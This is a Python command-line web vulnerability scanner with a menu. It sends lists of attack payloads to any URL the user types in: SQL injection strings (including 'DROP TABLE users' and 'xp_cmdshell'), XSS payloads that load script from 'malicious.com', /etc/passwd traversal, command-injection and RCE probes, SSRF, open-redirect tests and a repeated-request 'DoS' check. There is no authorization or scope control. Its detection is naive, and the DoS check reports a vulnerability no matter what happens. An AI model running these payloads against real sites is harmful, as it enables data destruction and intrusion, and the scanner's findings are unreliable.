import requests
from urllib.parse import urljoin
import time
from colorama import Fore, Style, init
import pyfiglet
import re

# Initialize colorama
init(autoreset=True)

# Banner
def print_banner():
    print(f"""{Fore.CYAN}                        R__Cyper Security__L""")
    welcome_message = pyfiglet.figlet_format("R_$ScanVuln$_L", font="standard")
    print(Fore.LIGHTCYAN_EX + Style.BRIGHT + welcome_message)

# Loading Animation
def loading_animation():
    print(f"{Fore.LIGHTCYAN_EX}Initializing the scanner...")
    animation = "|/-\\"
    for i in range(40):
        time.sleep(0.1)
        print(f"\r{Fore.YELLOW}Loading...... {animation[i % len(animation)]}", end="")
    print("\n")

# General vulnerability check function
def test_vulnerability(url, payloads, param, check_condition, message):
    vulnerable = False

    for payload in payloads:
        target = urljoin(url, f"?{param}={payload}")
        try:
            response = requests.get(target, timeout=5)
            if check_condition(response, payload):
                print(f"{Fore.GREEN}[+] {message} found: {target}")
                vulnerable = True
        except requests.RequestException:
            print(f"{Fore.RED}[-] Failed to test: {target}")

    if not vulnerable:
        print(f"{Fore.RED}[-] No vulnerabilities found for {message.lower()}.")

# Improved SQL Injection Check
def check_sql_injection(url):
    print(f"{Fore.YELLOW}[*] Checking for SQL Injection...")
    payloads = [
        "' OR '1'='1' --",
        "'; DROP TABLE users; --",
        "' UNION SELECT username, password FROM users --",
        "' AND 1=1 --",
        "' OR '1'='2' --",
        "' AND sleep(5) --",  # Time-based
        "' OR 'a'='a' --",
        "'; SELECT * FROM users --",
        "'; EXEC xp_cmdshell('whoami') --"
    ]
    test_vulnerability(url, payloads, "id",
                       lambda r, p: "error" in r.text.lower() or "mysql" in r.text.lower() or "syntax" in r.text.lower(),
                       "Potential SQL Injection")

# Improved XSS Check
def check_xss(url):
    print(f"{Fore.YELLOW}[*] Checking for XSS...")
    payloads = [
        "<script>alert('XSS')</script>",
        "<img src='x' onerror='alert(1)'>",
        "<svg/onload=alert(1)>",
        "<body onload=alert('XSS')>",
        "<iframe src='javascript:alert(1)'>",
        "';alert(1);//",
        "<input type='text' value='\" onfocus='alert(1)' autofocus>",
        "<a href='javascript:alert(1)'>Click me</a>",
        "<style>body{background:url('x');}</style>",
        "<iframe src='http://malicious.com'></iframe>",  # Test with iframe
        "<script src='http://malicious.com'></script>"  # External script
    ]

    def check_condition(response, payload):
        return (payload in response.text) or (re.search(r'alert\(\d+\)', response.text))

    test_vulnerability(url, payloads, "search", check_condition, "XSS vulnerability")

# CSRF Check
def check_csrf(url):
    print(f"{Fore.YELLOW}[*] Checking for CSRF...")
    try:
        response = requests.get(url, timeout=5)
        if "csrf" in response.text.lower():
            print(f"{Fore.RED}[-] CSRF token detected, no CSRF vulnerability found.")
        else:
            print(f"{Fore.GREEN}[+] CSRF vulnerability might exist on: {url}")
    except requests.RequestException:
        print(f"{Fore.RED}[-] Failed to test CSRF.")

# Information Disclosure Check
def check_info_disclosure(url):
    print(f"{Fore.YELLOW}[*] Checking for Information Disclosure...")
    payloads = ["/etc/passwd", "/proc/self/environ", "/proc/version", "/proc/cpuinfo"]
    test_vulnerability(url, payloads, "",
                       lambda r, p: "root:" in r.text or "apache" in r.text,
                       "Information Disclosure")

# SSRF Check
def check_ssrf(url):
    print(f"{Fore.YELLOW}[*] Checking for SSRF...")
    payloads = ["http://127.0.0.1:8080", "http://localhost:8080", "http://ust.com"]
    test_vulnerability(url, payloads, "url",
                       lambda r, p: "localhost" in r.text or "127.0.0.1" in r.text,
                       "SSRF vulnerability")

# File Inclusion Check
def check_file_inclusion(url):
    print(f"{Fore.YELLOW}[*] Checking for File Inclusion...")
    payloads = ["/etc/passwd", "php://filter/convert.base64-encode/resource=index.php", "http://example.com/file.txt"]
    test_vulnerability(url, payloads, "file",
                       lambda r, p: "root:" in r.text or "index.php" in r.text,
                       "File Inclusion")

# Directory Traversal Check
def check_directory_traversal(url):
    print(f"{Fore.YELLOW}[*] Checking for Directory Traversal...")
    payloads = ["../../../../etc/passwd", "../../../../var/log/syslog"]
    test_vulnerability(url, payloads, "file",
                       lambda r, p: "root:" in r.text,
                       "Directory Traversal")

# Command Injection Check
def check_command_injection(url):
    print(f"{Fore.YELLOW}[*] Checking for Command Injection...")
    payloads = ["; ls", "| ls", "'; whoami", "| whoami"]
    test_vulnerability(url, payloads, "command",
                       lambda r, p: "root:" in r.text or "bin" in r.text,
                       "Command Injection")

# File Upload Check
def check_file_upload(url, file_path):
    print(f"{Fore.YELLOW}[*] Checking for File Upload vulnerability...")
    files = {'file': open(file_path, 'rb')}

    try:
        response = requests.post(url, files=files)
        if response.status_code == 200:
            print(f"{Fore.GREEN}[+] File upload successful to {url}!")
        else:
            print(f"{Fore.RED}[-] File upload failed. Status code: {response.status_code}")
    except Exception as e:
        print(f"{Fore.RED}[-] Error during file upload: {e}")

# Denial of Service (DoS) Check
def check_dos(url):
    print(f"{Fore.YELLOW}[*] Checking for Denial of Service vulnerability...")
    try:
        for _ in range(10):  # Send multiple requests
            requests.get(url, timeout=1)
            print(f"{Fore.LIGHTYELLOW_EX}[+] Request sent to {url}")
        print(f"{Fore.GREEN}[+] Potential DoS vulnerability detected on {url}.")
    except requests.RequestException:
        print(f"{Fore.RED}[-] Error during DoS test.")

# Remote Code Execution (RCE) Check
def check_rce(url):
    print(f"{Fore.YELLOW}[*] Checking for Remote Code Execution (RCE)...")
    payloads = ["; echo vulnerable", "| echo vulnerable", "'; id", "| id", "'; uname -a", "| uname -a"]
    test_vulnerability(url, payloads, "cmd",
                       lambda r, p: "vulnerable" in r.text or "uid" in r.text,
                       "Remote Code Execution")

# Open Redirect Check
def check_open_redirect(url):
    print(f"{Fore.YELLOW}[*] Checking for Open Redirect...")
    payloads = [
        "http://malicious.com",
        "https://malicious.com",
        "ftp://malicious.com",
        "http://example.com/?redirect=http://malicious.com"
    ]
    test_vulnerability(url, payloads, "redirect",
                       lambda r, p: r.url != url and "malicious.com" in r.url,
                       "Open Redirect")

# Scan All Vulnerabilities
def scan_all(url):
    print(f"{Fore.CYAN}[*] Running a full scan on {url}...")
    loading_animation()
    check_sql_injection(url)
    check_xss(url)
    check_csrf(url)
    check_info_disclosure(url)
    check_ssrf(url)
    check_file_inclusion(url)
    check_directory_traversal(url)
    check_command_injection(url)
    check_dos(url)
    check_rce(url)
    check_open_redirect(url)

# Main Menu
def main_menu():
    print(f"""{Fore.CYAN}@@@@@=*_*=====================@_@===================*_*=@@@@@
{Fore.LIGHTMAGENTA_EX}[1] Scan for SQL Injection         {Fore.LIGHTMAGENTA_EX}[2] Scan for XSS
{Fore.LIGHTMAGENTA_EX}[3] Scan for CSRF                  {Fore.LIGHTMAGENTA_EX}[4] Scan for Information Disclosure
{Fore.LIGHTMAGENTA_EX}[5] Scan for SSRF                  {Fore.LIGHTMAGENTA_EX}[6] Scan for File Inclusion
{Fore.LIGHTMAGENTA_EX}[7] Scan for Directory Traversal   {Fore.LIGHTMAGENTA_EX}[8] Scan for Command Injection
{Fore.LIGHTMAGENTA_EX}[9] Scan for File Upload           {Fore.LIGHTMAGENTA_EX}[10] Scan for Denial of Service
{Fore.LIGHTMAGENTA_EX}[11] Scan for Remote Code Execution{Fore.LIGHTMAGENTA_EX}[12] Scan for Open Redirect
{Fore.LIGHTMAGENTA_EX}[13] Scan All Vulnerabilities      {Fore.RED}[0] Exit
{Fore.CYAN}@@@@@=*_*=====================@_@===================*_*=@@@@@""")

def main():
    print_banner()
    loading_animation()
    while True:
        main_menu()
        choice = input(f"{Fore.LIGHTYELLOW_EX}Enter your choice: ").strip()
        url = input(f"{Fore.CYAN}Enter the target URL: ").strip()
        if choice == "1":
            loading_animation()
            check_sql_injection(url)
        elif choice == "2":
            loading_animation()
            check_xss(url)
        elif choice == "3":
            loading_animation()
            check_csrf(url)
        elif choice == "4":
            loading_animation()
            check_info_disclosure(url)
        elif choice == "5":
            loading_animation()
            check_ssrf(url)
        elif choice == "6":
            loading_animation()
            check_file_inclusion(url)
        elif choice == "7":
            loading_animation()
            check_directory_traversal(url)
        elif choice == "8":
            loading_animation()
            check_command_injection(url)
        elif choice == "9":
            file_path = input(f"{Fore.CYAN}Enter the path of the file to upload: ").strip()
            check_file_upload(url, file_path)
        elif choice == "10":
            loading_animation()
            check_dos(url)
        elif choice == "11":
            loading_animation()
            check_rce(url)
        elif choice == "12":
            loading_animation()
            check_open_redirect(url)
        elif choice == "13":
            scan_all(url)
        elif choice == "0":
            print(f"{Fore.RED}Exiting the scanner. Goodbye!")
            break
        else:
            print(f"{Fore.RED}Invalid choice! Please try again.")

if __name__ == "__main__":
    main()
